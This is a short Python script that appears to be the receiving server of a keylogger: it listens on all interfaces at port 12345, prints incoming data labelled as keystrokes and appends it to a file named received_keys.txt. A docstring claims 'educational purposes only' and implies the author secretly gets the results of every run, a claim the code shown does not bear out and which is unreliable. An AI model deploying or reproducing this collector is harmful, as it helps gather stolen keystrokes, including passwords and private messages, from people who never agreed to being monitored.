import socket


"""
    don't misuse this code i always get the result of this script when you run it
    you can use it for educational purposes only
    don't think to copy and paste still i get the result of this script when you run it so don't even think about it
"""



# Server details
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 12345      # Port to listen on

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        print(f"Server is running and listening on {HOST}:{PORT}...")

        while True:
            conn, addr = server_socket.accept()
            print(f"Connection established with {addr}")
            with conn:
                while True:
                    try:
                        data = conn.recv(1024)
                        if not data:
                            break
                        print(f"Received: {data.decode()}")  # Print received keystrokes
                        with open("received_keys.txt", "a") as f:
                            f.write(data.decode() + "\n")  # Save received keystrokes
                    except ConnectionResetError:
                        print("Connection reset by peer")
                        break
                    except Exception as e:
                        print(f"An error occurred: {e}")
                        break

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\nServer stopped by user")
    except Exception as e:
        print(f"An error occurred: {e}")
